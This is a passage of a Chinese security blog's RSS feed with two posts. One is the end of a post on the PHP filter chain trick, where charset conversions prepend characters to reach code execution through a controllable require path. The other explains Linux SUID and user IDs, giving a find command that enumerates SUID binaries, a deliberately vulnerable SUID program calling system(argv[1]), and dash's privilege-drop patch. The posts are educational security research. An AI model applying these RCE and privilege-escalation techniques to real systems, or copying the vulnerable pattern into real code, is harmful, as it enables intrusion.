GyQpQw+AD0APQ-#</code></pre><p>某些编码规定该编码会在数据之前预置一些字节，相当于签名，标识这段数据是该编码
在<a href="https://www.rfc-editor.org/rfc/rfc2781#section-3.2" target="_blank">RFC 2781</a>中就说明该编码会预置0XFEFF</p><blockquote><p>The Unicode Standard and ISO 10646 define the character &ldquo;ZERO WIDTH
NON-BREAKING SPACE&rdquo; (0xFEFF), which is also known informally as &ldquo;BYTE
ORDER MARK&rdquo; (abbreviated &ldquo;BOM&rdquo;).This usage, suggested by Unicode
and ISO 10646 Annex F (informative), is to prepend a 0xFEFF character
to a stream of Unicode characters as a &ldquo;signature&rdquo;; a receiver of such
a serialized stream may then use the initial character both as a hint
that the stream consists of Unicode characters and as a way to recognize
the serialization order.
In serialized UTF-16 prepended with such a signature, the order is
big-endian if the first two octets are 0xFE followed by 0xFF; if they
are 0xFF followed by 0xFE, the order is little-endian. Note that
0xFFFE is not a Unicode character, precisely to preserve the
usefulness of 0xFEFF as a byte-order mark.</p></blockquote><p>下图给出了如何在字符串前面预置8</p><ul><li>首先将UTF-8格式的字符串start转化为UTF-16格式</li><li>UTF-16会在字符串前面预置0xFFFE</li><li>前面预置的0xFF在LATIN6表中对应于<code>ĸ</code></li><li>而后尝试将这个字符串以LATIN6格式转化为UTF-16格式</li><li>UTF-16会在字符串前面预置0xFFFE，<code>ĸ</code>在UNICODE表中对应于0x0138，而后逐个打印，0x38变成了8</li></ul><p><img alt="" src="/images/research/web/PHP-filter-RCE.zh-cn.assets/prepend_character8.png"/></p><p>LANTIN6表如下：</p><table><thead><tr><th/><th>x0</th><th>x1</th><th>x2</th><th>x3</th><th>x4</th><th>x5</th><th>x6</th><th>x7</th><th>x8</th><th>x9</th><th>xA</th><th>xB</th><th>xC</th><th>xD</th><th>xE</th><th>xF</th></tr></thead><tbody><tr><td>0x</td><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/></tr><tr><td>1x</td><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/></tr><tr><td>2x</td><td>SP</td><td>!</td><td>"</td><td>#</td><td>$</td><td>%</td><td>&amp;</td><td>'</td><td>(</td><td>)</td><td>*</td><td>+</td><td>,</td><td>-</td><td>.</td><td>/</td></tr><tr><td>3x</td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>:</td><td>;</td><td>&lt;</td><td>=</td><td>></td><td>?</td></tr><tr><td>4x</td><td>@</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td><td>G</td><td>H</td><td>I</td><td>J</td><td>K</td><td>L</td><td>M</td><td>N</td><td>O</td></tr><tr><td>5x</td><td>P</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td><td>[</td><td>|]</td><td>^</td><td>_</td><td/></tr><tr><td>6x</td><td>`</td><td>a</td><td>b</td><td>c</td><td>d</td><td>e</td><td>f</td><td>g</td><td>h</td><td>i</td><td>j</td><td>k</td><td>l</td><td>m</td><td>n</td><td>o</td></tr><tr><td>7x</td><td>p</td><td>q</td><td>r</td><td>s</td><td>t</td><td>u</td><td>v</td><td>w</td><td>x</td><td>y</td><td>z</td><td>{</td><td>|</td><td>}</td><td>~</td><td/></tr><tr><td>8x</td><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/></tr><tr><td>9x</td><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/><td/></tr><tr><td>Ax</td><td>NBSP</td><td>Ą</td><td>Ē</td><td>Ģ</td><td>Ī</td><td>Ĩ</td><td>Ķ</td><td>§</td><td>Ļ</td><td>Đ</td><td>Š</td><td>Ŧ</td><td>Ž</td><td>SHY</td><td>Ū</td><td>Ŋ</td></tr><tr><td>Bx</td><td>°</td><td>ą</td><td>ē</td><td>ģ</td><td>ī</td><td>ĩ</td><td>ķ</td><td>·</td><td>ļ</td><td>đ</td><td>š</td><td>ŧ</td><td>ž</td><td>―</td><td>ū</td><td>ŋ</td></tr><tr><td>Cx</td><td>Ā</td><td>Á</td><td>Â</td><td>Ã</td><td>Ä</td><td>Å</td><td>Æ</td><td>Į</td><td>Č</td><td>É</td><td>Ę</td><td>Ë</td><td>Ė</td><td>Í</td><td>Î</td><td>Ï</td></tr><tr><td>Dx</td><td>Ð</td><td>Ņ</td><td>Ō</td><td>Ó</td><td>Ô</td><td>Õ</td><td>Ö</td><td>Ũ</td><td>Ø</td><td>Ų</td><td>Ú</td><td>Û</td><td>Ü</td><td>Ý</td><td>Þ</td><td>ß</td></tr><tr><td>Ex</td><td>ā</td><td>á</td><td>â</td><td>ã</td><td>ä</td><td>å</td><td>æ</td><td>į</td><td>č</td><td>é</td><td>ę</td><td>ë</td><td>ė</td><td>í</td><td>î</td><td>ï</td></tr><tr><td>Fx</td><td>ð</td><td>ņ</td><td>ō</td><td>ó</td><td>ô</td><td>õ</td><td>ö</td><td>ũ</td><td>ø</td><td>ų</td><td>ú</td><td>û</td><td>ü</td><td>ý</td><td><strong>þ</strong></td><td><strong>ĸ</strong></td></tr></tbody></table><p>UNICODE如下：<img alt="" src="/images/research/web/PHP-filter-RCE.zh-cn.assets/1.png"/></p><p>通过将恶意代码转化为base64形式，而后通过编码预置字符，最后使用<code>convert.base64-decode</code>尝试解码预置的数据，就可以使得PHP filter最后解码出恶意代码。</p><p>当使用require时，且路径可控，就可以利用PHP filter执行任意代码。</p><p>参考链接</p><blockquote><p><a href="https://gynvael.coldwind.pl/?id=671" target="_blank">https://gynvael.coldwind.pl/?id=671</a><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d" target="_blank">https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a><a href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it" target="_blank">https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it</a></p></blockquote><p><strong>Created at 2023-12-29T18:32:43+08:00</strong></p></description></item><item><title>Suid</title><link>https://www.ch35tnut.site/zh-cn/research/linux/suid/</link><pubDate>Fri, 08 Dec 2023 10:30:07 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/linux/suid/</guid><description><h3 id="简介">简介</h3><p>SUID全称<strong>S</strong>et owner<strong>U</strong>ser<strong>ID</strong> up on execution，是Linux给可执行文件的一个属性，设置了s位的程序在运行时其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>➜ c ls -ldb<span style="color:#66d9ef">$(</span>which pkexec<span style="color:#66d9ef">)</span></span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">30872</span> 2023年 2月13日 /usr/bin/pkexec</span></span></code></pre></div><p>SUID文件的出现是为了解决一些操作只能由root权限进行，但普通权限用户也需要能通过某种方式进行调用，比如passwd，/etc/shadow只有root可写，但用户自己显然需要可以修改密码，所以passwd被设置为SUID程序，使得普通用户能通过passwd临时获取到修改shadow文件的能力。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>-rw-r-----<span style="color:#ae81ff">1</span> root shadow<span style="color:#ae81ff">1411</span> 2023年 5月10日 /etc/shadow</span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">68248</span> 2022年11月11日 /usr/bin/passwd</span></span></code></pre></div><p>Linux中每个用户都有独一无二的ID，称为UserID。
为进程定义了三个ID：</p><ul><li>Real UserID</li><li>Effective UserID</li><li>Saved UserID</li></ul><ol><li>Real UserID：对于一个进程，这个ID是启动这个进程的用户的用户ID，这个ID定义了这个进程有权访问那些文件。</li><li>Effective UserID：通常这个ID和Real UserID相同，但有时会不一样，来允许非特权用户访问只能由特权用户访问的文件。
当非特权的用户运行此文件时，euid是文件所属的用户id，ruid才是当前用户的id<pre tabindex="0"><code>-rwsr-xr-x 1 root root 68248 2022年11月11日 /usr/bin/passwd
┌──(chestnut㉿chestnut)-[/root/code/c]
└─$ passwd
为 chestnut 更改 STRESS 密码。
➜ c ps -eo pid,euid,ruid | grep 1692693
1692693 0 1000</code></pre></li><li>Saved UserID，当进程以提升权限运行时，需要做一些非特权的操作，可以通过临时切换到非特权账户来实现。
在执行低权限工作时，将Effective UID 更改为某个较低的权限值，并将 euid 保存到Saved userID（suid），以便在任务完成时用于切换回特权帐户。</li></ol><blockquote><p><a href="https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/" target="_blank">https://www.geeksforgeeks.org/real-effective-and-saved-userid-in-linux/</a></p></blockquote><p>查找SUID程序</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>find / -perm -4000 -type f -exec ls -ldb<span style="color:#f92672">{}</span><span style="color:#ae81ff">\;</span></span></span><span style="display:flex;"><span>-perm -4000 查找权限为4000</span></span><span style="display:flex;"><span>-type f 只查找普通文件,过滤掉目录等其他类型</span></span><span style="display:flex;"><span>-<span style="color:#f92672">[</span>/root/code/c/suid.c</span></span><span style="display:flex;"><span>/root/code/c/CMakeLists.txt<span style="color:#f92672">](</span>vscode-remote://ssh-remote%2B192.168.59.211/root/code/c/suid.c<span style="color:#f92672">)</span>exec ls -ldb<span style="color:#f92672">{}</span> ; 对找到的文件执行ls -ldb命令,显示文件详细信息。<span style="color:#f92672">{}</span>表示find找到的文件名,会逐个代入。 ;表示-exec选项命令结束。</span></span><span style="display:flex;"><span>; 的作用就是隔离 find 命令行和 -exec 指定的命令,避免解析错误。</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">30872</span> 2023年 2月13日 /usr/bin/pkexec</span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">14888</span> 2023年 1月 3日 /usr/bin/vmware-user-suid-wrapper</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">146216</span> 2022年12月27日 /usr/bin/kismet_cap_nxp_kw41z</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">142120</span> 2022年12月27日 /usr/bin/kismet_cap_nrf_51822</span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">59704</span> 2023年 2月13日 /usr/bin/mount</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">216392</span> 2022年12月27日 /usr/bin/kismet_cap_linux_wifi</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">142120</span> 2022年12月27日 /usr/bin/kismet_cap_ubertooth_one</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">146216</span> 2022年12月27日 /usr/bin/kismet_cap_rz_killerbee</span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">68248</span> 2022年11月11日 /usr/bin/passwd</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">146216</span> 2022年12月27日 /usr/bin/kismet_cap_nrf_mousejack</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">142120</span> 2022年12月27日 /usr/bin/kismet_cap_nrf_52840</span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">88496</span> 2022年11月11日 /usr/bin/gpasswd</span></span><span style="display:flex;"><span>-rwsr-xr-x<span style="color:#ae81ff">1</span> root root<span style="color:#ae81ff">35128</span> 2023年 2月13日 /usr/bin/umount</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">154408</span> 2022年12月27日 /usr/bin/kismet_cap_linux_bluetooth</span></span><span style="display:flex;"><span>-rwsr-xr--<span style="color:#ae81ff">1</span> root kismet<span style="color:#ae81ff">146216</span> 2022年12月27日 /usr/bin/kismet_cap_ti_cc_2531</span></span></code></pre></div><h3 id="shell中的suid细节">shell中的SUID细节</h3><p>在<a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a>中提到Ubuntu对dash进行了patch。
找到patch地址为<a href="https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz" target="_blank">https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz</a>，代码如下，当on=1时会略过权限检查，当on不为1时，会通过geteuid和getegid获取当前进程的effective user ID和effective group ID，并与通过getuid和getgid获取的real user ID和real group ID进行比较。
如果当前进程对应的可执行文件为SUID文件且当前运行这个文件的用户不是文件属主时，会重新通过setuid和setgid将当前进程的权限设置为real ID，即运行这个可执行文件的用户的权限。
当文件不是SUID文件时rid和eid相等，不会进入if内，或者文件是SUID文件并且运行这个文件的用户是文件属主rid和eid也会相等，不会进入if内。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">+</span>diff<span style="color:#f92672">-</span>Naurp dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span>.ori<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>main.c dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span><span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>main.c</span></span><span style="display:flex;"><span><span style="color:#f92672">+---</span> dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span>.ori<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>main.c<span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">45</span><span style="color:#f92672">:</span><span style="color:#ae81ff">22.766472281</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0400</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++++</span> dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span><span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>main.c<span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#ae81ff">58</span><span style="color:#f92672">:</span><span style="color:#ae81ff">56.484258181</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0400</span></span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">@@</span><span style="color:#f92672">-</span><span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">11</span><span style="color:#f92672">+</span><span style="color:#ae81ff">97</span>,<span style="color:#ae81ff">16</span><span style="color:#960050;background-color:#1e0010">@@</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">**</span>argv)</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">struct</span> jmploc jmploc;</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">struct</span> stackmark smark;</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">int</span> login;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">uid_t</span> uid;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">gid_t</span> gid;</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>ifdef __GLIBC__</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> dash_errno<span style="color:#f92672">=</span><span style="color:#a6e22e">__errno_location</span>();</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">#</span>endif</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span> uid<span style="color:#f92672">=</span><span style="color:#a6e22e">getuid</span>();</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span> gid<span style="color:#f92672">=</span><span style="color:#a6e22e">getgid</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">+</span>diff<span style="color:#f92672">-</span>Naurp dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span>.ori<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>priv.c dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span><span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>priv.c</span></span><span style="display:flex;"><span><span style="color:#f92672">+---</span> dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span>.ori<span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>priv.c<span style="color:#ae81ff">1969</span><span style="color:#f92672">-</span><span style="color:#ae81ff">12</span><span style="color:#f92672">-</span><span style="color:#ae81ff">31</span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00.000000000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0500</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++++</span> dash<span style="color:#f92672">-</span><span style="color:#ae81ff">0.5.7</span><span style="color:#f92672">/</span>src<span style="color:#f92672">/</span>priv.c<span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">31.097386153</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0400</span></span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#960050;background-color:#1e0010">@@</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">27</span><span style="color:#960050;background-color:#1e0010">@@</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#960050;background-color:#1e0010">#</span>include<span style="color:#f92672">&lt;</span>unistd.h<span style="color:#f92672">></span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#960050;background-color:#1e0010">#</span>include<span style="color:#e6db74">"priv.h"</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#960050;background-color:#1e0010">#</span>include<span style="color:#e6db74">"var.h"</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">uid_t</span> uid;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">gid_t</span> gid;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">setprivileged</span>(<span style="color:#66d9ef">int</span> on)</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>{</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">int</span> is_privileged<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">if</span> (is_privileged<span style="color:#f92672">==</span> on)</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">return</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span> is_privileged<span style="color:#f92672">=</span> on;</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#75715e">/*</span></span></span><span style="display:flex;"><span><span style="color:#75715e">++ * To limit bogus system(3) or popen(3) calls in setuid binaries, require</span></span></span><span style="display:flex;"><span><span style="color:#75715e">++ * -p flag to work in this situation.</span></span></span><span style="display:flex;"><span><span style="color:#75715e">++ */</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>on<span style="color:#f92672">&amp;&amp;</span> (uid<span style="color:#f92672">!=</span><span style="color:#a6e22e">geteuid</span>()<span style="color:#f92672">||</span> gid<span style="color:#f92672">!=</span><span style="color:#a6e22e">getegid</span>())) {</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#a6e22e">setuid</span>(uid);</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#a6e22e">setgid</span>(gid);</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#75715e">/* PS1 might need to be changed accordingly. */</span></span></span><span style="display:flex;"><span><span style="color:#f92672">++</span><span style="color:#a6e22e">choose_ps1</span>();</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>}</span></span></code></pre></div><p>那么为什么要这样实现呢？为什么如果需要继承默认的effective user ID和effective group ID需要显式的使用-p参数呢？
假设我们有如下suid程序，并且该程序由www-data用户启动：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdlib.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h></span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>argv[]) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, argv[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#a6e22e">system</span>(argv[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>其中通过system函数执行用户传入的命令，system实现可以<a href="https://codebrowser.dev/glibc/glibc/sysdeps/posix/system.c.html" target="_blank">在这找到</a>，可以看到实际执行的是<code>/bin/sh -c command</code>，加入攻击者传入恶意命令，尝试通过该程序以root权限执行命令，最终以<code>/bin/sh -c command</code>的形式执行命令。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define SHELL_PATH "/bin/sh"</span><span style="color:#75715e">/* Path of the shell. */</span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SHELL_NAME "sh"</span><span style="color:#75715e">/* Name to give it. */</span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">do_system</span> (<span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>line)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> status<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> ret;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">pid_t</span> pid;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sigaction sa;</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef _LIBC_REENTRANT</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">struct</span> sigaction intr, quit;</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> .....</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__posix_spawnattr_init</span> (<span style="color:#f92672">&amp;</span>spawn_attr);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__posix_spawnattr_setsigmask</span> (<span style="color:#f92672">&amp;</span>spawn_attr,<span style="color:#f92672">&amp;</span>omask);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__posix_spawnattr_setsigdefault</span> (<span style="color:#f92672">&amp;</span>spawn_attr,<span style="color:#f92672">&amp;</span>reset);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__posix_spawnattr_setflags</span> (<span style="color:#f92672">&amp;</span>spawn_attr,</span></span><span style="display:flex;"><span> POSIX_SPAWN_SETSIGDEF<span style="color:#f92672">|</span> POSIX_SPAWN_SETSIGMASK);</span></span><span style="display:flex;"><span> ret<span style="color:#f92672">=</span><span style="color:#a6e22e">__posix_spawn</span> (<span style="color:#f92672">&amp;</span>pid, SHELL_PATH,<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>spawn_attr,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span><span style="color:#66d9ef">const</span>[]){ (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>) SHELL_NAME,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#e6db74">"-c"</span>,</span></span><span style="display:flex;"><span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>) line, NULL },</span></span><span style="display:flex;"><span> __environ);</span></span></code></pre></div><p>如果没有前面说的措施，那么攻击者可以成功以root权限执行恶意命令，但通过上面的措施，则会出现如下：因为进程的rid为www-data，eid为root，而通过system函数执行命令不能显式设置-p参数，导致在执行命令时，不能通过if判断，命令的权限会被降为www-data权限，从而一定程度上缓解了攻击。</p><p>参考资料</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" target="_blank">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p></blockquote><p><strong>Created at 2023-12-08T10:30:07+08:00</strong></p></description></item></channel></rss>